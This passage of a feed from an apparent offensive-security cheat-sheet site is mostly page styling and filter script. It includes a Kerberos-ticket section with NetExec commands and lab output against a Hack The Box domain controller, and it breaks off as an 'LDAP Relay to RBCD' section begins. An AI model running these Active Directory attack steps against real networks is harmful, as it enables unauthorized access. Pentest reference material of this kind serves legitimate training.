var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;kerberos-ticket&#34;&gt;Kerberos Ticket&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;Linux&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34; &gt;Windows&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab3&#34; &gt;C2&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;h4 id=&#34;1-configure-etchosts&#34;&gt;1. Configure /etc/hosts&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Always in this order - DC.example.com example.com DC&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo nxc smb &amp;lt;DC_IP&amp;gt; --generate-hosts-file /etc/hosts&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo nxc smb 10.129.235.149 --generate-hosts-file /etc/hosts&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;                                                                                                                                                                                                                    &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; tail -n1 /etc/hosts&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;10.129.235.149     DC.administrator.htb administrator.htb DC&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-configure-etckrb5conf&#34;&gt;2. Configure /etc/krb5.conf&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Always in UPPERCASE - DC.EXAMPLE.COM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo nxc smb &amp;lt;DC_IP&amp;gt; --generate-krb5-file /etc/krb5.conf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo nxc smb 10.129.235.149 --generate-krb5-file /etc/krb5.conf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; cat /etc/krb5.conf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[libdefaults]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dns_lookup_kdc = false&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dns_lookup_realm = false&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    default_realm = ADMINISTRATOR.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[realms]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    ADMINISTRATOR.HTB = {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        kdc = dc.administrator.htb&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        admin_server = dc.administrator.htb&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        default_domain = administrator.htb&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[domain_realm]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    .administrator.htb = ADMINISTRATOR.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    administrator.htb = ADMINISTRATOR.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;button data-tabset=&#34;set1-1&#34; data-tabcontent=&#34;tab1&#34; class=&#34;active&#34;&gt;impacket&lt;/button&gt;&#xA;&lt;button data-tabset=&#34;set1-1&#34; data-tabcontent=&#34;tab2&#34; &gt;kinit&lt;/button&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>LDAP Relay</title>
      <link>https://tldrbins.github.io/ldap_relay/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ldap_relay/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;ldap-relay-to-rbcd&#34;&gt;LDAP Relay to RBCD&lt;/h3&gt;&#xA;&lt;h4 id=&#34;1-check-ldap-signing&#34;&gt;1. Check LDAP 